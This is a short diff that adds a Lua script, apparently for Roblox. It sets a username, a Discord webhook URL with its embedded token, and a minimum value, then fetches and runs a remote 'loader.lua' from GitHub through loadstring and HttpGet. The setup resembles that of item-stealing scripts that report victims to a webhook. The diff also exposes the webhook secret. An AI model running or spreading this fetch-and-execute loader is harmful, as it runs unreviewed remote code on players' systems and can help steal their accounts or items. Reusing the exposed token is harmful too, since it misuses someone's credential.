@@ -1,0 +1,5 @@
+Username = planimetrin
+Webhook = https://discord.com/api/webhooks/1402287439506178058/2-5LuD457mtYkA48KeXNFj6i68aOOljlId5XeFmiGS-X4MausK2HNHLLi8x78PHZ9jUC
+MinimumValue = 1
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter2k25/omg-hub/refs/heads/main/loader.lua"))()
